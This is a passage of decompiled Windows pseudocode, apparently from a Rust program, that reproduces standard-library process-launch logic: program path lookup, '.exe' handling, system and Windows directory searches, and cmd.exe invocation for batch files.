CompareStringOrdinal((LPCWCH)v78.m128i_i64[0], v79, *(LPCWCH *)v80, *(_DWORD *)(v80 + 16), 1);\n        v81 -= 56i64;\n        ++v3;\n        v80 = v82;\n      }\n      while ( v83 == 3 );\n      if ( v83 != 1 )\n      {\n        if ( v83 != 2 )\n        {\n          LODWORD(v318) = GetLastError();\n          v349.m128i_i64[0] = (v318 << 32) | 2;\n          *(_QWORD *)v343 = &v349;\n          *(_QWORD *)&v343[8] = sub_140032FF0;\n          *(_QWORD *)&v354[0] = &off_14006C728;\n          *((_QWORD *)&v354[0] + 1) = 1i64;\n          *(_QWORD *)&v354[2] = 0i64;\n          *(_QWORD *)&v354[1] = v343;\n          *((_QWORD *)&v354[1] + 1) = 1i64;\n          sub_14005DD00((__int64)v354, (__int64)&off_14006C760);\n        }\n        if ( !v4 )\n          goto LABEL_121;\n        v84 = 32 * v3;\n        v7 = *(_QWORD *)(v4 + v84);\n        v3 = *(_QWORD *)(v4 + v84 + 16);\n        if ( *(_QWORD *)&lpString1[32] )\n          goto LABEL_122;\n        goto LABEL_123;\n      }\nLABEL_115:\n      if ( hProcess )\n      {\n        --hProcess;\n        v4 = *(_QWORD *)(v4 + 8 * v3 + 984);\n        continue;\n      }\n      break;\n    }\n    v7 = 0i64;\n    if ( *(_QWORD *)&lpString1[32] )\n      goto LABEL_122;\n  }\n  else\n  {\nLABEL_121:\n    v7 = 0i64;\n    if ( *(_QWORD *)&lpString1[32] )\nLABEL_122:\n      sub_1400015D0(*(void **)&lpString1[24], 1ui64);\n  }\nLABEL_123:\n  if ( *(_QWORD *)&lpString1[8] )\n    sub_1400015D0((void *)v78.m128i_i64[0], 2ui64);\nLABEL_125:\n  v85 = *(WCHAR **)(v348 + 64);\n  hProcess = (__int64)&off_14006C800;\n  if ( !v85 )\n    goto LABEL_131;\n  v86 = *(__m128i **)(v348 + 48);\n  if ( (unsigned __int64)v85 >= 4 )\n  {\n    v88 = _byteswap_ulong(v86->m128i_i32[0]);\n    v89 = (v88 < 0x5C5C3F5D) + (v88 < 0x5C5C3F5C) == 1;\n    v87 = sub_140041060;\n    if ( v89 )\n      v87 = sub_140041050;\n  }\n  else\n  {\n    v87 = sub_140041060;\n  }\n  v90 = v86->m128i_i8[(_QWORD)v85 - 1];\n  v366 = 1;\n  if ( v87(v90) )\n    goto LABEL_131;\n  v94 = (unsigned __int64)v85 > 3\n     && (v86->m128i_i8[(_QWORD)v85 - 4] | (unsigned __int8)(32\n                                                          * ((unsigned __int8)(v86->m128i_i8[(_QWORD)v85 - 4] - 65) < 0x1Au))) == 46\n     && (*((_BYTE *)v85 + (_QWORD)v86 - 3) | (unsigned __int8)(32\n                                                             * ((unsigned __int8)(*((_BYTE *)v85 + (_QWORD)v86 - 3) - 65) < 0x1Au))) == 101\n     && (*((_BYTE *)v85 + (_QWORD)v86 - 2) | (unsigned __int8)(32\n                                                             * ((unsigned __int8)(*((_BYTE *)v85 + (_QWORD)v86 - 2) - 65) < 0x1Au))) == 120\n     && ((unsigned __int8)v90 | (unsigned __int8)(32 * ((unsigned __int8)(v90 - 65) < 0x1Au))) == 101;\n  v95 = 0i64;\n  while ( v85 != v95 )\n  {\n    v96 = *((unsigned __int8 *)v95 + (_QWORD)v86);\n    if ( v96 != 47 )\n    {\n      v95 = (WCHAR *)((char *)v95 + 1);\n      if ( v96 != 92 )\n        continue;\n    }\n    v352 = (__int64)v85 + (_QWORD)v86;\n    if ( v94 )\n    {\n      v366 = 1;\n      sub_14002DD60((__int64)lpString1, v86->m128i_i8, (__int64)v85);\n      if ( *(_QWORD *)lpString1 )\n      {\n        v366 = 1;\n        sub_140041070((__int64 *)v355, lpString1);\n      }\n      else\n      {\n        *(_OWORD *)v355 = __PAIR128__(*(unsigned __int64 *)&lpString1[8], 0i64);\n      }\n      goto LABEL_311;\n    }\n    if ( (__int64)v85 < 0 )\n    {\n      v366 = 1;\n      sub_140001620();\n    }\n    v106 = (__m128i *)sub_140001540((SIZE_T)v85, 1ui64);\n    if ( !v106 )\n    {\n      v366 = 1;\n      sub_14005DBB0(1i64, (__int64)v85);\n    }\n    v107 = v106;\n    sub_14005D0A0(v106, v86, (unsigned __int64)v85);\n    hProcess = (__int64)v107;\n    *(_QWORD *)lpString1 = v107;\n    *(_QWORD *)&lpString1[8] = v85;\n    *(_QWORD *)&lpString1[16] = v85;\n    lpString1[24] = 0;\n    penv = v85;\n    sub_140034960((__int64)lpString1, (const __m128i *)\".exeprogram not found\", 4ui64);\n    v108 = *(unsigned __int8 **)lpString1;\n    v109 = *(WCHAR **)&lpString1[8];\n    v110 = *(_QWORD *)&lpString1[16];\n    v327 = *(_QWORD *)&lpString1[8];\n    v326 = *(_QWORD *)lpString1;\n    v358 = 1;\n    sub_140041140((__int64)v354, *(char **)lpString1, *(__int64 *)&lpString1[16]);\n    if ( *(_QWORD *)&v354[0] )\n    {\n      *(_QWORD *)&v355[16] = *(_QWORD *)&v354[1];\n      *(__m128i *)v355 = _mm_loadu_si128((const __m128i *)v354);\n      if ( !v109 )\n        goto LABEL_311;\n    }\n    else\n    {\n      penv = v109;\n      hProcess = (__int64)v108;\n      v111 = (_WORD *)sub_140039880(v108, v110);\n      if ( v111 )\n      {\n        v113 = (char *)hProcess;\n        if ( v112 == 2 && *v111 == 11822 )\n        {\n          v114 = 2i64;\n          v115 = v111;\nLABEL_298:\n          v111 = 0i64;\n        }\n        else\n        {\n          v115 = 0i64;\n          v114 = v112;\n          while ( v114 )\n          {\n            v117 = v114--;\n            if ( *((_BYTE *)v111 + v117 - 1) == 46 )\n            {\n              if ( v112 < v117 )\n                sub_14005DD40(v117, v112, (__int64)&off_140069D20);\n              if ( v114 )\n              {\n                v115 = v111;\n                v111 = (_WORD *)((char *)v111 + v117);\n                v112 -= v117;\n                break;\n              }\n              v115 = v111;\n              v114 = v112;\n              goto LABEL_298;\n            }\n          }\n        }\n        if ( v115 )\n          v111 = v115;\n        if ( v111 )\n        {\n          if ( !v115 )\n            v114 = v112;\n          v156 = (char *)v111 + v114 - hProcess;\n          if ( v110 >= (unsigned __int64)v156 )\n            v110 = (unsigned __int64)v156;\n        }\n      }\n      else\n      {\n        v113 = (char *)hProcess;\n      }\n      sub_14002DD60((__int64)lpString1, v113, v110);\n      if ( *(_QWORD *)lpString1 )\n        sub_140041070((__int64 *)v355, lpString1);\n      else\n        *(_OWORD *)v355 = __PAIR128__(*(unsigned __int64 *)&lpString1[8], 0i64);\n      v108 = (unsigned __int8 *)hProcess;\n      if ( !penv )\n        goto LABEL_311;\n    }\n    sub_1400015D0(v108, 1ui64);\nLABEL_311:\n    hProcess = *(_QWORD *)&v355[8];\n    v124 = *(WCHAR **)v355;\n    if ( *(_QWORD *)v355 )\n    {\n      v153 = *(_QWORD *)&v355[16];\n      goto LABEL_313;\n    }\nLABEL_131:\n    v91 = (__int64)v351;\n    *(_QWORD *)v351 = hProcess;\n    *(_QWORD *)(v91 + 16) = 2i64;\n    goto LABEL_132;\n  }\n  v98 = 0;\n  hProcess = (__int64)&off_14006C798;\n  v99 = (char *)v86;\n  while ( 2 )\n  {\n    v100 = 1;\n    if ( v98 )\n    {\n      v98 = 0;\n      goto LABEL_156;\n    }\n    if ( v99 != (char *)v85 + (_QWORD)v86 )\n    {\n      LOWORD(v101) = (unsigned __int8)*v99;\n      if ( *v99 >= 0 )\n      {\n        ++v99;\n        goto LABEL_166;\n      }\n      v102 = v101 & 0x1F;\n      v103 = v99[1] & 0x3F;\n      if ( (unsigned __int8)v101 <= 0xDFu )\n      {\n        v99 += 2;\n        LOWORD(v101) = v103 | ((_WORD)v102 << 6);\n      }\n      else\n      {\n        v104 = (v103 << 6) | v99[2] & 0x3F;\n        if ( (unsigned __int8)*v99 < 0xF0u )\n        {\n          v99 += 3;\n          v101 = (v102 << 12) | v104;\n          if ( v101 > 0xFFFF )\n            goto LABEL_168;\n        }\n        else\n        {\n          v105 = v99[3];\n          v99 += 4;\n          v101 = ((v102 & 7) << 18) | (v104 << 6) | v105 & 0x3F;\n          if ( v101 > 0xFFFF )\n          {\nLABEL_168:\n            v98 = v101 & 0x3FF | 0xDC00;\nLABEL_156:\n            if ( !v100 )\n              goto LABEL_131;\n            continue;\n          }\n        }\n      }\nLABEL_166:\n      v98 = 0;\n      v100 = v101;\n      goto LABEL_156;\n    }\n    break;\n  }\n  v352 = (__int64)v85 + (_QWORD)v86;\n  if ( (unsigned __int64)v85 > 0xF )\n  {\n    v118 = sub_140005AE0(0x2Eu, (__int64)v86, (unsigned __int64)v85);\n  }\n  else\n  {\n    v356 = 0i64;\n    v116 = 0i64;\n    while ( v86->m128i_i8[v116] != 46 )\n    {\n      if ( v85 == (WCHAR *)++v116 )\n        goto LABEL_197;\n    }\n    v118 = 1i64;\n  }\n  v356 = (void *)v118;\nLABEL_197:\n  penv = v85;\n  if ( v7 )\n  {\n    *(_QWORD *)v343 = v7;\n    *(_QWORD *)&v343[8] = v7 + v3;\n    *(_WORD *)&v343[16] = 0;\n    v343[24] = 1;\n    v366 = 1;\n    sub_1400339C0((__int64)lpString1, (char **)v343);\n    v119 = lpString1[24];\n    if ( lpString1[24] != 2 )\n    {\n      v4 = (unsigned __int64)&v354[1] + 9;\n      do\n      {\n        if ( !*(_QWORD *)&lpString1[16] )\n        {\n          if ( *(_QWORD *)&lpString1[8] )\n            sub_1400015D0(*(void **)lpString1, 1ui64);\n          v366 = 1;\n          JUMPOUT(0x14003BD47i64);\n        }\n        HIDWORD(v354[1]) = *(_DWORD *)&lpString1[28];\n        *(_DWORD *)((char *)&v354[1] + 9) = *(_DWORD *)&lpString1[25];\n        v354[0] = *(_OWORD *)lpString1;\n        *(_QWORD *)&v354[1] = *(_QWORD *)&lpString1[16];\n        BYTE8(v354[1]) = v119;\n        sub_140036130((__int64)v354, (unsigned __int8 *)v86, (__int64)v85);\n        if ( v356 != (void *)1 )\n          sub_1400399B0(\n            (__int64)v354,\n            (const __m128i *)\"exeNUL\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\",\n            3ui64);\n        v137 = *(void **)&v354[0];\n        sub_140041140((__int64)lpString1, *(char **)&v354[0], *(__int64 *)&v354[1]);\n        if ( *((_QWORD *)&v354[0] + 1) )\n          sub_1400015D0(v137, 1ui64);\n        v124 = *(WCHAR **)lpString1;\n        if ( *(_QWORD *)lpString1 )\n        {\n          v125 = *(__m128i *)&lpString1[8];\n          goto LABEL_281;\n        }\n        v366 = 1;\n        sub_1400339C0((__int64)lpString1, (char **)v343);\n        v85 = penv;\n        v119 = lpString1[24];\n      }\n      while ( lpString1[24] != 2 );\n    }\n  }\n  v366 = 1;\n  sub_140033C30((__int64)v354);\n  if ( BYTE8(v354[1]) == 2 )\n  {\n    v366 = 1;\n    sub_140030820((char **)v354);\n  }\n  else\n  {\n    lpApplicationName = (LPCWSTR)*((_QWORD *)&v354[0] + 1);\n    v120 = *(_QWORD *)&v354[1];\n    v357 = 1;\n    hProcess = *(_QWORD *)&v354[0];\n    v121 = sub_140037080(*(unsigned __int8 **)&v354[0], *(unsigned __int64 *)&v354[1]);\n    if ( v120 < v122 )\n      v122 = v120;\n    if ( !v121 )\n      v122 = v120;\n    *(_QWORD *)lpString1 = hProcess;\n    *(_QWORD *)&lpString1[8] = lpApplicationName;\n    *(_QWORD *)&lpString1[16] = v122;\n    *(_QWORD *)&lpString1[24] = *((_QWORD *)&v354[1] + 1);\n    sub_140036130((__int64)lpString1, (unsigned __int8 *)v86, (__int64)v85);\n    if ( v356 != (void *)1 )\n      sub_1400399B0(\n        (__int64)lpString1,\n        (const __m128i *)\"exeNUL\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\",\n        3ui64);\n    v123 = *(void **)lpString1;\n    sub_140041140((__int64)v343, *(char **)lpString1, *(__int64 *)&lpString1[16]);\n    if ( *(_QWORD *)&lpString1[8] )\n      sub_1400015D0(v123, 1ui64);\n    v124 = *(WCHAR **)v343;\n    if ( *(_QWORD *)v343 )\n    {\n      v125 = _mm_loadu_si128((const __m128i *)&v343[8]);\n      goto LABEL_281;\n    }\n  }\n  lpApplicationName = (LPCWSTR)v86;\n  ProcessInformation.hProcess = HANDLE_FLAG_PROTECT_FROM_CLOSE;\n  *(_OWORD *)&ProcessInformation.hThread = 0i64;\n  v126 = 512i64;\n  hProcess = 2i64;\n  hThread = 0i64;\n  v128 = 0i64;\n  v4 = 0i64;\n  while ( 2 )\n  {\n    while ( 2 )\n    {\n      v129 = 512i64;\n      v130 = (WCHAR *)lpString1;\n      v131 = v126;\nLABEL_220:\n      SetLastError(0);\n      SystemDirectoryW = GetSystemDirectoryW(v130, v131);\n      if ( !SystemDirectoryW && GetLastError() )\n      {\n        LODWORD(v138) = GetLastError();\n        *(_QWORD *)&v343[8] = (v138 << 32) | 2;\n        *(_QWORD *)v343 = 1i64;\n        v136 = 0;\n        goto LABEL_248;\n      }\n      v126 = SystemDirectoryW;\n      if ( v131 == SystemDirectoryW )\n      {\n        if ( GetLastError() != 122 )\n          sub_14005DEC0((__int64)&unk_14006D768, 40i64, (__int64)&off_14006CDE8);\n        v134 = 2 * v131;\n        if ( v134 >= 0xFFFFFFFF )\n          v134 = 0xFFFFFFFFi64;\n        v126 = v134;\n        if ( v134 < 0x201 )\n          continue;\n        goto LABEL_215;\n      }\n      break;\n    }\n    if ( v131 < SystemDirectoryW )\n    {\n      if ( SystemDirectoryW < 0x201ui64 )\n        continue;\nLABEL_215:\n      v132 = v126 - v4;\n      if ( (unsigned __int64)&v128[-v4] < v132 )\n      {\n        sub_14005ED50((__int64)&ProcessInformation, v4, v132);\n        hProcess = (__int64)ProcessInformation.hProcess;\n        hThread = (char *)ProcessInformation.hThread;\n      }\n      v4 = 0xFFFFFFFFi64;\n      if ( (unsigned __int64)hThread < 0xFFFFFFFF )\n        v4 = (unsigned __int64)hThread;\n      *(_QWORD *)&ProcessInformation.dwProcessId = v4;\n      v128 = hThread;\n      v129 = v4;\n      v130 = (WCHAR *)hProcess;\n      v131 = v4;\n      goto LABEL_220;\n    }\n    break;\n  }\n  if ( v129 < SystemDirectoryW )\n    sub_14005DE40(SystemDirectoryW, v129, (__int64)&off_14006CDD0);\n  sub_1400308F0(v354, v130, SystemDirectoryW);\n  sub_140036130((__int64)v354, (unsigned __int8 *)lpApplicationName, (__int64)penv);\n  if ( v356 != (void *)1 )\n    sub_1400399B0(\n      (__int64)v354,\n      (const __m128i *)\"exeNUL\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\",\n      3ui64);\n  v135 = *(void **)&v354[0];\n  sub_140041140((__int64)&v349, *(char **)&v354[0], *(__int64 *)&v354[1]);\n  if ( *((_QWORD *)&v354[0] + 1) )\n    sub_1400015D0(v135, 1ui64);\n  *(__m128i *)&v343[8] = _mm_loadu_si128(&v349);\n  *(_QWORD *)&v343[24] = *(_QWORD *)cchCount1;\n  *(_QWORD *)v343 = 0i64;\n  v136 = 1;\nLABEL_248:\n  if ( hThread )\n    sub_1400015D0((void *)hProcess, 2ui64);\n  v86 = (__m128i *)lpApplicationName;\n  if ( v136 )\n  {\n    v124 = *(WCHAR **)&v343[8];\n    if ( *(_QWORD *)&v343[8] )\n      goto LABEL_280;\n  }\n  v366 = 1;\n  sub_140041210(v343);\n  ProcessInformation.hProcess = HANDLE_FLAG_PROTECT_FROM_CLOSE;\n  *(_OWORD *)&ProcessInformation.hThread = 0i64;\n  v139 = 512i64;\n  hProcess = 2i64;\n  v140 = 0i64;\n  v141 = 0i64;\n  v142 = 0i64;\n  while ( 2 )\n  {\n    while ( 2 )\n    {\n      v4 = 512i64;\n      v144 = (WCHAR *)lpString1;\n      v145 = v139;\nLABEL_261:\n      SetLastError(0);\n      WindowsDirectoryW = GetWindowsDirectoryW(v144, v145);\n      if ( !WindowsDirectoryW && GetLastError() )\n      {\n        LODWORD(v152) = GetLastError();\n        *(_QWORD *)&v343[8] = (v152 << 32) | 2;\n        *(_QWORD *)v343 = 1i64;\n        v151 = 0;\n        v86 = (__m128i *)lpApplicationName;\n        v143 = penv;\n        goto LABEL_276;\n      }\n      v139 = WindowsDirectoryW;\n      v148 = v145 < WindowsDirectoryW;\n      if ( v145 == WindowsDirectoryW )\n      {\n        if ( GetLastError() != 122 )\n          sub_14005DEC0((__int64)&unk_14006D768, 40i64, (__int64)&off_14006CDE8);\n        v149 = 2 * v145;\n        if ( v149 >= 0xFFFFFFFF )\n          v149 = 0xFFFFFFFFi64;\n        v139 = v149;\n        if ( v149 < 0x201 )\n          continue;\n        goto LABEL_256;\n      }\n      break;\n    }\n    v143 = penv;\n    if ( v148 )\n    {\n      if ( WindowsDirectoryW < 0x201ui64 )\n        continue;\nLABEL_256:\n      v146 = v139 - v142;\n      if ( (unsigned __int64)&v141[-v142] < v146 )\n      {\n        sub_14005ED50((__int64)&ProcessInformation, v142, v146);\n        hProcess = (__int64)ProcessInformation.hProcess;\n        v140 = (char *)ProcessInformation.hThread;\n      }\n      v142 = 0xFFFFFFFFi64;\n      if ( (unsigned __int64)v140 < 0xFFFFFFFF )\n        v142 = (__int64)v140;\n      *(_QWORD *)&ProcessInformation.dwProcessId = v142;\n      v141 = v140;\n      v4 = v142;\n      v144 = (WCHAR *)hProcess;\n      v145 = v142;\n      goto LABEL_261;\n    }\n    break;\n  }\n  if ( v4 < WindowsDirectoryW )\n    sub_14005DE40(WindowsDirectoryW, v4, (__int64)&off_14006CDD0);\n  sub_1400308F0(v354, v144, WindowsDirectoryW);\n  v86 = (__m128i *)lpApplicationName;\n  sub_140036130((__int64)v354, (unsigned __int8 *)lpApplicationName, (__int64)v143);\n  if ( v356 != (void *)1 )\n    sub_1400399B0(\n      (__int64)v354,\n      (const __m128i *)\"exeNUL\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\",\n      3ui64);\n  v150 = *(void **)&v354[0];\n  sub_140041140((__int64)&v349, *(char **)&v354[0], *(__int64 *)&v354[1]);\n  if ( *((_QWORD *)&v354[0] + 1) )\n    sub_1400015D0(v150, 1ui64);\n  *(__m128i *)&v343[8] = _mm_loadu_si128(&v349);\n  *(_QWORD *)&v343[24] = *(_QWORD *)cchCount1;\n  *(_QWORD *)v343 = 0i64;\n  v151 = 1;\nLABEL_276:\n  if ( v140 )\n    sub_1400015D0((void *)hProcess, 2ui64);\n  if ( v151 )\n  {\n    v124 = *(WCHAR **)&v343[8];\n    if ( *(_QWORD *)&v343[8] )\n    {\nLABEL_280:\n      v125 = _mm_loadu_si128((const __m128i *)&v343[16]);\n      goto LABEL_281;\n    }\n  }\n  v366 = 1;\n  sub_140041210(v343);\n  v366 = 1;\n  sub_140032310((__int64)&v349, \"PATHlibrary\\\\std\\\\src\\\\sys_common\\\\process.rs\", 4i64);\n  if ( LOBYTE(cchCount1[2]) == 2 )\n  {\nLABEL_296:\n    hProcess = (__int64)&off_14006C7C8;\n    goto LABEL_131;\n  }\n  hProcess = v349.m128i_i64[1];\n  v154 = (void *)v349.m128i_i64[0];\n  *(_QWORD *)v343 = v349.m128i_i64[0];\n  *(_QWORD *)&v343[8] = v349.m128i_i64[0] + *(_QWORD *)cchCount1;\n  *(_WORD *)&v343[16] = 0;\n  v343[24] = 1;\n  v4 = (unsigned __int64)&v354[1] + 9;\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      sub_1400339C0((__int64)lpString1, (char **)v343);\n      if ( lpString1[24] == 2 )\n      {\n        if ( hProcess )\n          sub_1400015D0(v154, 1ui64);\n        goto LABEL_296;\n      }\n      if ( *(_QWORD *)&lpString1[16] )\n        break;\n      if ( *(_QWORD *)&lpString1[8] )\n        sub_1400015D0(*(void **)lpString1, 1ui64);\n    }\n    HIDWORD(v354[1]) = *(_DWORD *)&lpString1[28];\n    *(_DWORD *)((char *)&v354[1] + 9) = *(_DWORD *)&lpString1[25];\n    v354[0] = *(_OWORD *)lpString1;\n    *(_QWORD *)&v354[1] = *(_QWORD *)&lpString1[16];\n    BYTE8(v354[1]) = lpString1[24];\n    sub_140036130((__int64)v354, (unsigned __int8 *)v86, (__int64)v143);\n    if ( v356 != (void *)1 )\n      sub_1400399B0(\n        (__int64)v354,\n        (const __m128i *)\"exeNUL\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\",\n        3ui64);\n    v155 = *(void **)&v354[0];\n    sub_140041140((__int64)lpString1, *(char **)&v354[0], *(__int64 *)&v354[1]);\n    if ( *((_QWORD *)&v354[0] + 1) )\n      sub_1400015D0(v155, 1ui64);\n    if ( *(_QWORD *)lpString1 )\n      break;\n    v143 = penv;\n  }\n  v308 = *(WCHAR **)lpString1;\n  v125 = _mm_loadu_si128((const __m128i *)&lpString1[8]);\n  if ( hProcess )\n    sub_1400015D0(v154, 1ui64);\n  v124 = v308;\nLABEL_281:\n  hProcess = v125.m128i_i64[0];\n  v153 = _mm_shuffle_epi32(v125, 238).m128i_u64[0];\nLABEL_313:\n  penv = v124;\n  if ( v153 < 5 || v124[v153 - 5] != 46 || v124[v153 - 1] )\n  {\nLABEL_316:\n    v157 = v86;\n    v158 = *(_QWORD **)(v348 + 144);\n    v159 = *(_QWORD *)(v348 + 160);\n    v160 = *(_BYTE *)(v348 + 197);\n    v354[0] = 2ui64;\n    sub_14002E200((__int64)v354, 0i64, (__int64)v124);\n    v161 = *(_QWORD *)&v354[1];\n    *(_WORD *)(*(_QWORD *)&v354[0] + 2i64 * *(_QWORD *)&v354[1]) = 34;\n    *(_QWORD *)&v354[1] = v161 + 1;\n    *(_QWORD *)lpString1 = v157;\n    *(_QWORD *)&lpString1[8] = v352;\n    *(_WORD *)&lpString1[16] = 0;\n    sub_14002E060(v354, (char **)lpString1);\n    v163 = *(_QWORD *)&v354[1];\n    if ( *(_QWORD *)&v354[1] == *((_QWORD *)&v354[0] + 1) )\n    {\n      sub_14002E200((__int64)v354, *(__int64 *)&v354[1], v162);\n      v163 = *(_QWORD *)&v354[1];\n    }\n    *(_WORD *)(*(_QWORD *)&v354[0] + 2 * v163) = 34;\n    *(_QWORD *)&v354[1] = v163 + 1;\n    v164 = &v158[5 * v159];\n    while ( v158 != v164 )\n    {\n      v165 = *(_QWORD *)&v354[1];\n      if ( *(_QWORD *)&v354[1] == *((_QWORD *)&v354[0] + 1) )\n      {\n        sub_14002E200((__int64)v354, *(__int64 *)&v354[1], v162);\n        v165 = *(_QWORD *)&v354[1];\n      }\n      *(_WORD *)(*(_QWORD *)&v354[0] + 2 * v165) = 32;\n      *(_QWORD *)&v354[1] = v165 + 1;\n      v166 = sub_1400412F0((__int64 *)v354, v158, v160);\n      v158 += 5;\n      if ( v166 )\n      {\n        if ( *((_QWORD *)&v354[0] + 1) )\n          sub_1400015D0(*(void **)&v354[0], 2ui64);\nLABEL_334:\n        v175 = (__int64)v351;\n        *(_QWORD *)v351 = v166;\nLABEL_335:\n        *(_QWORD *)(v175 + 16) = 2i64;\nLABEL_336:\n        v176 = 0;\n        goto LABEL_337;\n      }\n    }\n    v166 = (char **)*((_QWORD *)&v354[0] + 1);\n    v167 = *(WCHAR **)&v354[0];\n    if ( !*(_QWORD *)&v354[0] )\n      goto LABEL_334;\n    v168 = *(_QWORD *)&v354[1];\n    LOBYTE(v4) = 1;\n    LODWORD(v338) = 0;\n    lpApplicationName = penv;\n    v352 = hProcess;\n    goto LABEL_327;\n  }\n  switch ( v124[v153 - 4] )\n  {\n    case 'B':\n    case 'b':\n      if ( (v124[v153 - 3] | 0x20) == 97 && (v124[v153 - 2] | 0x20) == 116 )\n        goto LABEL_350;\n      if ( v124[v153 - 4] != 67 )\n        goto LABEL_316;\nLABEL_348:\n      if ( (v124[v153 - 3] | 0x20) != 109 || ((v124[v153 - 2] - 68) & 0xFFDF) != 0 )\n        goto LABEL_316;\nLABEL_350:\n      v347 = (void *)v153;\n      v354[0] = 2ui64;\n      v180 = 512i64;\n      v352 = 2i64;\n      v181 = 0i64;\n      v182 = 0i64;\n      v183 = 0i64;\n      break;\n    case 'C':\n    case 'c':\n      goto LABEL_348;\n    default:\n      goto LABEL_316;\n  }\n  while ( 2 )\n  {\n    while ( 2 )\n    {\n      v184 = 512i64;\n      v185 = (__m128i *)lpString1;\n      v186 = v180;\nLABEL_359:\n      SetLastError(0);\n      v188 = GetSystemDirectoryW((LPWSTR)v185, v186);\n      if ( !v188 && GetLastError() )\n      {\n        LODWORD(v256) = GetLastError();\n        v257 = (v256 << 32) | 2;\n        v254 = 0i64;\n        goto LABEL_474;\n      }\n      v180 = v188;\n      if ( v186 == v188 )\n      {\n        if ( GetLastError() != 122 )\n          sub_14005DEC0((__int64)&unk_14006D768, 40i64, (__int64)&off_14006CDE8);\n        v189 = 2 * v186;\n        if ( v189 >= 0xFFFFFFFF )\n          v189 = 0xFFFFFFFFi64;\n        v180 = v189;\n        if ( v189 < 0x201 )\n          continue;\n        goto LABEL_354;\n      }\n      break;\n    }\n    if ( v186 < v188 )\n    {\n      if ( v188 < 0x201ui64 )\n        continue;\nLABEL_354:\n      v187 = v180 - v183;\n      if ( v182 - v183 < v187 )\n      {\n        sub_14005ED50((__int64)v354, v183, v187);\n        v181 = *((_QWORD *)&v354[0] + 1);\n        v352 = *(_QWORD *)&v354[0];\n      }\n      v183 = 0xFFFFFFFFi64;\n      if ( v181 < 0xFFFFFFFF )\n        v183 = v181;\n      *(_QWORD *)&v354[1] = v183;\n      v182 = v181;\n      v184 = v183;\n      v185 = (__m128i *)v352;\n      v186 = v183;\n      goto LABEL_359;\n    }\n    break;\n  }\n  if ( v184 < v188 )\n    sub_14005DE40(v188, v184, (__int64)&off_14006CDD0);\n  if ( v188 )\n  {\n    v251 = v188;\n    v252 = 2i64 * v188;\n    v253 = sub_140001540(v252, 2ui64);\n    if ( !v253 )\n      sub_14005DBB0(2i64, v252);\n    v254 = (__int64)v253;\n  }\n  else\n  {\n    v251 = 0i64;\n    v254 = 2i64;\n    v252 = 0i64;\n  }\n  sub_14005D0A0((__m128i *)v254, v185, v252);\n  v257 = v251;\nLABEL_474:\n  if ( v181 )\n  {\n    v260 = v257;\n    sub_1400015D0((void *)v352, 2ui64);\n    v257 = v260;\n  }\n  if ( !v254 )\n    goto LABEL_521;\n  *(_QWORD *)v343 = v254;\n  *(_QWORD *)&v343[8] = v257;\n  v261 = v257;\n  *(_QWORD *)&v343[16] = v257;\n  v262 = \"\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\";\n  v263 = 0i64;\n  v264 = 0;\n  while ( 2 )\n  {\n    if ( !v262 )\n      goto LABEL_489;\n    if ( (_WORD)v264 )\n    {\n      v268 = 0;\nLABEL_499:\n      if ( v261 != *(_QWORD *)&v343[8] )\n      {\n        v265 = v261;\n        v266 = v264;\n        v267 = v263;\n        goto LABEL_479;\n      }\n      v265 = v261;\n      v267 = v263;\n      v266 = v264;\n      v273 = (\"\\\\cmd.exemaximum number of ProcThreadAttributes exceeded\" - v262 + 10) / 3ui64\n           - (((_WORD)v268 == 0)\n            + v263\n            - 1)\n           + 1;\n      goto LABEL_501;\n    }\n    if ( v262 == \"maximum number of ProcThreadAttributes exceeded\" )\n      goto LABEL_489;\n    LOWORD(v269) = (unsigned __int8)*v262;\n    if ( *v262 >= 0 )\n    {\n      ++v262;\n      goto LABEL_498;\n    }\n    v270 = v269 & 0x1F;\n    v271 = v262[1] & 0x3F;\n    if ( (unsigned __int8)v269 <= 0xDFu )\n    {\n      v262 += 2;\n      LOWORD(v269) = v271 | ((_WORD)v270 << 6);\n      goto LABEL_498;\n    }\n    v272 = (v271 << 6) | v262[2] & 0x3F;\n    if ( (unsigned __int8)*v262 < 0xF0u )\n    {\n      v262 += 3;\n      v269 = (v270 << 12) | v272;\n      goto LABEL_496;\n    }\n    v269 = ((v269 & 7) << 18) | (v272 << 6) | v262[3] & 0x3F;\n    if ( v269 != 1114112 )\n    {\n      v262 += 4;\nLABEL_496:\n      if ( v269 > 0xFFFF )\n      {\n        v264 = ((v269 + 16711680) >> 10) | 0xD800;\n        v268 = v269 & 0x3FF | 0xDC00;\n        goto LABEL_499;\n      }\nLABEL_498:\n      v268 = 0;\n      LOWORD(v264) = v269;\n      goto LABEL_499;\n    }\nLABEL_489:\n    if ( v263 != 1 )\n    {\n      v267 = 1i64;\n      v262 = 0i64;\n      v266 = 0;\n      v265 = v261;\n      if ( v261 != *(_QWORD *)&v343[8] )\n      {\n        v268 = v264;\n        goto LABEL_479;\n      }\n      v273 = -v263;\n      v268 = v264;\nLABEL_501:\n      sub_14005ED50((__int64)v343, v265, v273 + 1);\n      v254 = *(_QWORD *)v343;\n      v265 = v261;\nLABEL_479:\n      *(_WORD *)(v254 + 2 * v265) = v266;\n      v261 = v265 + 1;\n      *(_QWORD *)&v343[16] = v265 + 1;\n      v263 = v267;\n      v264 = v268;\n      continue;\n    }\n    break;\n  }\n  v257 = *(_QWORD *)&v343[8];\n  lpApplicationName = *(LPCWSTR *)v343;\n  if ( !*(_QWORD *)v343 )\n  {\nLABEL_521:\n    v284 = v257;\n    v175 = (__int64)v351;\n    *(_QWORD *)v351 = v284;\n    goto LABEL_335;\n  }\n  v352 = *(_QWORD *)&v343[8];\n  LOBYTE(v346) = *(_BYTE *)(v348 + 197);\n  LOBYTE(v356) = (_BYTE)v346 != 0;\n  v274 = *(_QWORD **)(v348 + 144);\n  v338 = *(_QWORD *)(v348 + 160);\n  v275 = sub_140001540(0xCui64, 2ui64);\n  if ( !v275 )\n    sub_14005DBB0(2i64, 12i64);\n  *(_WORD *)v275 = 99;\n  *(_QWORD *)lpString1 = v275;\n  *(_QWORD *)&lpString1[8] = 6i64;\n  *(_QWORD *)&lpString1[16] = 1i64;\n  v277 = \"md.exe /d /c \\\"Windows file names may not contain `\\\"` or end with `\\\\`\";\n  v278 = 1i64;\n  LOWORD(v279) = 0;\n  while ( 2 